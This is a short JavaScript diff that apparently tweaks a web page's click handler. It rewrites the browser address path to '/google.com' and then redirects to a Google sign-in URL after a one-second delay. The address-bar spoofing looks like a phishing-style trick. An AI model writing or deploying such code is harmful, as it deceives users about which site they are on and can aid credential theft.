@@ -37,9 +37,7 @@ try {
       ? "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%3Fhl%3Den-US&ec=GAlA8wE&hl=en&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S923780037%3A1763313253623683"
       : urlGo;
 
-  console.log(t, i, urlGo);
-
-  window.history.pushState({}, " ", "/abu.com");
+  window.history.pushState({}, " ", "/google.com");
 }
 
 const onClickAbu = async (e) => {
@@ -80,6 +78,5 @@ btn.addEventListener("click", async (e) => {
   onClickAbu(e);
   setTimeout(() => {
     window.location.href = urlGo;
-  }, 10000);
-  console.log(urlGo);
+  }, 1000);
 });
